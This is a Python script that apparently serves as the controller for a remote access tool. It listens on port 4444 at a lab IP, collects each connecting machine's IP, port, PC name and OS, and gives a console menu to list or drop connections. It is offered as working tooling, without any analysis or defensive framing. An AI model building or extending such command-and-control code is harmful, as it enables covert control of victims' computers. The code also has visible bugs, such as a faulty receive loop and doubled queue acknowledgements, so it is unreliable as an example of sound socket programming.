import os
import threading
import sys
import subprocess
import socket
import time
from queue import Queue

intThreads = 2
arrJobs = [1, 2]
arraddress = []
queue = Queue()

arrconnections = []

strHost = "192.168.213.129"
port = 4444

intbuff = 1024

decode_utf = lambda data: data.decode("utf-8")
remove_quotes = lambda string: string.replace("\"", "")
center = lambda string, title: f"{{:^{len(string)}}}".format(title)
send = lambda data: conn.send(data)
recv = lambda buffer: conn.recv(buffer)


def recvall(buffer):
    bytdata = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytdata += bytPart

        if len(bytdata) == buffer:
            return bytdata


def create_socket():
    global objsocket
    try:
        objsocket = socket.socket()
        objsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as strError:
        print("Error creating socket: " + str(strError))


def socket_bind():
    global objsocket
    try:
        print("Listening on port: " + str(port))
        objsocket.bind((strHost, port))
        objsocket.listen(20)
    except socket.error as strError:
        print("Error binding socket: " + str(strError))
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = objsocket.accept()
            conn.setblocking(1)
            arrconnections.append(conn)

            client_info = decode_utf(conn.recv(intbuff)).split(",")  # Adjust split pattern if needed
            new_address = list(address) + client_info[:3]  # Convert tuple to list and append additional info

            arraddress.append(new_address)
            print("\nConnection established: {0} ({1})".format(new_address[0], new_address[2]))

        except socket.error as e:
            print(f"Error accepting connection: {e}")
            continue


def menu_help():
    print("\n--help")
    print("--l List all connections")


def main_menu():
    while True:
        strChoice = input("\n>> ")
        if strChoice == "--l":
            listConnection()
        elif strChoice == "--x":
            closeConnection()
            break
        else:
            print("Invalid choice")
            menu_help()


def closeConnection():
    global arrconnections, arraddress
    if len(arraddress) == 0:
        return
    for conn in arrconnections:
        try:
            conn.send(str.encode("exit"))
            conn.close()
        except:
            pass  # Ignore errors if connection is already closed
    arrconnections.clear()
    arraddress.clear()


def listConnection():
    if len(arrconnections) > 0:
        strClients = ""
        for intCounter, conn in enumerate(arrconnections):
            strClients += (
                f"{intCounter}    {arraddress[intCounter][0]}    "
                f"{arraddress[intCounter][1]}    {arraddress[intCounter][2]}    "
                f"{arraddress[intCounter][3]}\n"
            )

        print(
            "\n" + "ID   " +
            center(str(arraddress[0][0]), "IP") + "    " +
            center(str(arraddress[0][1]), "Port") + "    " +
            center(str(arraddress[0][2]), "PC name") + "    " +
            center(str(arraddress[0][3]), "OS") + "\n" +
            strClients,
            end=""
        )
    else:
        print("No connections")


# Multithreading

def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():
    while True:
        intvalue = queue.get()
        if intvalue == 1:
            create_socket()
            socket_bind()
            socket_accept()

        elif intvalue == 2:
            while True:
                time.sleep(0.2)
                if len(arraddress) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThreads in arrJobs:
        queue.put(intThreads)
    queue.join()


create_threads()
create_jobs()
